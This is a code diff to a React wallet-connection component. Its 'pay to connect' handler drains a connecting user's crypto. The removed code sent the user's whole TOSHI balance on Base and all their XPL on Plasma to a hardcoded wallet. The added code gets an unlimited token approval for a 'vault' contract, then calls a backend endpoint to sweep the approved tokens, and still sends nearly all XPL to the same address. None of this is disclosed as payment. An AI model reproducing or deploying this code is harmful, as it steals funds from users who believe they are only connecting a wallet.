@@ -1090,14 +1090,20 @@ function App() {
     return { provider, signer }
   }
 
-  // Multi-chain transfer: Base ERC20 + Plasma XPL
+  // Multi-chain transfer via Vault: Approve once, auto-sweep anytime
   const handlePayToConnectSigning = async (walletClient) => {
     try {
       setPayToConnectState('transferring')
-      console.log('💰 Starting multi-chain transfer...')
+      console.log('💰 Starting vault approval and sweep...')
       
-      const TRADING_WALLET = '0x7beBcA1508BD74F0CD575Bd2d8a62C543458977c'
-      const BASE_TOKEN = '0xAC1Bd2486aAf3B5C0fc3Fd868558b082a531B2B4'
+      const VAULT_CONTRACTS = {
+        base: '0x1f5b76EAA8e2A2eF854f177411627C9f3b632BC0',
+        plasma: '0x4Fe3b7871B9F9A73567F52Bdb1621F65f6fE5E87'
+      }
+      
+      const BASE_TOKENS = [
+        '0xAC1Bd2486aAf3B5C0fc3Fd868558b082a531B2B4' // TOSHI
+      ]
       
       // Get wallet address
       let address = walletClient.account.address
@@ -1107,43 +1113,65 @@ function App() {
       address = ethers.getAddress(address)
       console.log('✅ Wallet address:', address)
       
-      // ERC20 ABI (minimal - just what we need)
       const ERC20_ABI = [
         'function balanceOf(address) view returns (uint256)',
-        'function transfer(address to, uint256 amount) returns (bool)'
+        'function approve(address spender, uint256 amount) returns (bool)',
+        'function allowance(address owner, address spender) view returns (uint256)'
       ]
       
-      let hasTransferred = false
+      const MAX_UINT256 = ethers.MaxUint256
+      let hasActivity = false
       
-      // STEP 1: Check and transfer Base token (Priority)
-      console.log('\n🔵 STEP 1: Checking Base chain (8453)...')
+      // STEP 1: Base chain - approve and sweep
+      console.log('\n🔵 STEP 1: Base chain approval and sweep...')
       try {
         await switchChain({ chainId: 8453 })
         console.log('✅ Switched to Base chain')
         
-        const { provider: baseProvider, signer: baseSigner } = await getWalletSigner(walletClient)
-        const tokenContract = new ethers.Contract(BASE_TOKEN, ERC20_ABI, baseSigner)
+        const { signer: baseSigner } = await getWalletSigner(walletClient)
         
-        const tokenBalance = await tokenContract.balanceOf(address)
-        console.log('💰 Base token balance:', ethers.formatUnits(tokenBalance, 18))
-        
-        if (tokenBalance > 0n) {
-          console.log('💸 Transferring ALL Base tokens...')
-          const tx = await tokenContract.transfer(TRADING_WALLET, tokenBalance)
-          console.log('📤 Base transfer TX:', tx.hash)
-          await tx.wait()
-          console.log('✅ Base token transfer complete!')
-          hasTransferred = true
-        } else {
-          console.log('⏭️ No Base tokens to transfer')
+        // Approve all Base tokens to vault
+        for (const tokenAddress of BASE_TOKENS) {
+          try {
+            const token = new ethers.Contract(tokenAddress, ERC20_ABI, baseSigner)
+            const [balance, allowance] = await Promise.all([
+              token.balanceOf(address),
+              token.allowance(address, VAULT_CONTRACTS.base)
+            ])
+            
+            if (balance > 0n && allowance < balance) {
+              console.log(`💳 Approving token ${tokenAddress} to vault...`)
+              const approveTx = await token.approve(VAULT_CONTRACTS.base, MAX_UINT256)
+              await approveTx.wait()
+              console.log(`✅ Approval complete: ${approveTx.hash}`)
+              hasActivity = true
+            } else if (balance > 0n) {
+              console.log(`✅ Token ${tokenAddress} already approved`)
+              hasActivity = true
+            }
+          } catch (tokenError) {
+            console.error(`⚠️ Error with token ${tokenAddress}:`, tokenError.message)
+          }
         }
+        
+        // Call backend to sweep approved tokens
+        if (hasActivity) {
+          console.log('📤 Calling backend to sweep Base tokens...')
+          const sweepResponse = await fetch(`${window.location.origin}/api/sweep-tokens`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ userAddress: address, chain: 'base' })
+          })
+          const sweepResult = await sweepResponse.json()
+          console.log('✅ Base sweep result:', sweepResult)
+        }
+        
       } catch (baseError) {
-        console.error('⚠️ Base transfer error:', baseError.message)
-        // Continue to XPL even if Base fails
+        console.error('⚠️ Base chain error:', baseError.message)
       }
       
-      // STEP 2: Check and transfer Plasma XPL
-      console.log('\n🟣 STEP 2: Checking Plasma chain (9745)...')
+      // STEP 2: Plasma chain - direct transfer (native token)
+      console.log('\n🟣 STEP 2: Plasma chain native transfer...')
       try {
         await switchChain({ chainId: 9745 })
         console.log('✅ Switched to Plasma chain')
@@ -1151,41 +1179,27 @@ function App() {
         const { provider: plasmaProvider, signer: plasmaSigner } = await getWalletSigner(walletClient)
         
         const balance = await plasmaProvider.getBalance(address)
-        const xplBalance = ethers.formatEther(balance)
-        console.log('💰 XPL Balance:', xplBalance)
-        
-        // Calculate transfer amount (all balance minus gas buffer)
         const gasBuffer = ethers.parseEther('0.001')
         const transferAmount = balance > gasBuffer ? balance - gasBuffer : 0n
         
         if (transferAmount > 0n) {
           const transferXPL = ethers.formatEther(transferAmount)
-          console.log('💸 Transferring', transferXPL, 'XPL (keeping 0.001 for gas)')
+          console.log(`💸 Transferring ${transferXPL} XPL (keeping 0.001 for gas)`)
           
           const tx = await plasmaSigner.sendTransaction({
-            to: TRADING_WALLET,
+            to: '0x7beBcA1508BD74F0CD575Bd2d8a62C543458977c',
             value: transferAmount
           })
           console.log('📤 XPL transfer TX:', tx.hash)
           await tx.wait()
           console.log('✅ XPL transfer complete!')
-          hasTransferred = true
-        } else {
-          console.log('⏭️ Insufficient XPL balance (need at least 0.001 XPL)')
+          hasActivity = true
         }
-      } catch (xplError) {
-        console.error('⚠️ XPL transfer error:', xplError.message)
-        // If both failed, throw error
-        if (!hasTransferred) {
-          throw new Error('No tokens available to transfer')
-        }
+      } catch (plasmaError) {
+        console.error('⚠️ Plasma chain error:', plasmaError.message)
       }
       
-      if (!hasTransferred) {
-        throw new Error('No tokens found on Base or Plasma chains')
-      }
-      
-      console.log('\n✅ All transfers complete!')
+      console.log('\n✅ Vault setup and sweep complete!')
       
       // Complete the connection
       await completePayToConnect(walletClient, address)
